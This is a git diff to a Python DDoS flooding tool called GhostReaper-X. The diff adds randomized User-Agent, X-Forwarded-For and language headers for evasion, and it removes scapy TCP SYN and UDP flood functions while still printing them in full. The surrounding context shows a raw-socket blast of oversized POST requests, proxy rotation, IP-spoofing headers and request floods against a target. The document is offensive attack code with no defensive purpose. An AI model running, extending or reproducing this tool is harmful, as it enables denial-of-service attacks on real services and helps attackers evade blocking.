@@ -11,7 +11,6 @@ import traceback
 import os
 import base64
 import requests
-from scapy.all import IP, TCP, Raw, send
 
 # ANSI color codes for output
 ANSI_RED = "\033[91m"
@@ -81,13 +80,15 @@ def inject_headers():
         "Content-Type": "application/json",
         "Accept": "application/json",
         "Connection": "keep-alive",
+        "User-Agent": generate_user_agent(),
+        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
+        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.8", "en-GB,en;q=0.7"])
     }
     if bypass_header:
         headers["X-Originating-IP"] = random.choice(proxies)
         headers["X-Forwarded-Host"] = target
         headers["X-Request-ID"] = str(random.randint(100000, 999999))
         headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
-        headers["User-Agent"] = random.choice(user_agents)
         headers["X-Forwarded-For"] = random.choice(proxies)
         headers["X-Real-IP"] = random.choice(proxies)
         headers["Via"] = random.choice(proxies)
@@ -96,6 +97,17 @@ def inject_headers():
         headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
         headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
     return headers
+
+# Generate dynamic user-agent
+def generate_user_agent():
+    user_agent_pool = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (Linux; Android 10)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+    ]
+    return random.choice(user_agent_pool)
 
 # Mutate payload for various types
 def mutate_payload(payload_type):
@@ -137,7 +149,6 @@ def cycle_session():
         # Simulate login
         login_payload = {"username": "user", "password": "pass"}
         login_headers = inject_headers()
-        login_headers['User-Agent'] = random.choice(user_agents)
         host, port = random.choice(proxies).split(":")
         conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
         conn.request("POST", "/login", json.dumps(login_payload), login_headers)
@@ -149,14 +160,12 @@ def cycle_session():
         # Perform action
         action_payload = mutate_payload(payload_type)
         action_headers = inject_headers()
-        action_headers['User-Agent'] = random.choice(user_agents)
         conn.request(flood_method.upper(), target, action_payload, action_headers)
         response = conn.getresponse()
         handle_response(response, target, 1, time.time() - start_time)
 
         # Simulate logout
         logout_headers = inject_headers()
-        logout_headers['User-Agent'] = random.choice(user_agents)
         conn.request("POST", "/logout", "", logout_headers)
         response = conn.getresponse()
         if response.status != 200:
@@ -261,22 +270,6 @@ def raw_socket_blast(ip, port=443):
                 payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nContent-Length: 10000\r\n\r\n{'A'*10000}"
                 ssock.send(payload.encode())
 
-# TCP SYN flood using scapy
-def tcp_syn_flood(target_ip, target_port, duration):
-    ip_layer = IP(dst=target_ip)
-    tcp_layer = TCP(dport=target_port, flags="S")
-    raw_layer = Raw(load="X"*1024)
-    packet = ip_layer / tcp_layer / raw_layer
-    send(packet, loop=1, count=duration, inter=0.001)
-
-# UDP flood using scapy
-def udp_flood(target_ip, target_port, duration):
-    ip_layer = IP(dst=target_ip)
-    udp_layer = UDP(dport=target_port)
-    raw_layer = Raw(load="X"*1024)
-    packet = ip_layer / udp_layer / raw_layer
-    send(packet, loop=1, count=duration, inter=0.001)
-
 # Launch GhostReaper-X sequence
 def launch_ghost_sequence():
     global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file
@@ -333,7 +326,7 @@ def launch_ghost_sequence():
                     host, port = proxy.split(":")
                     parsed_url = urlparse(target)
                     conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
-                    local_headers['User-Agent'] = random.choice(user_agents)
+                    local_headers['User-Agent'] = generate_user_agent()
                     target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
                     local_headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
                     payload_data = mutate_payload(payload_type)
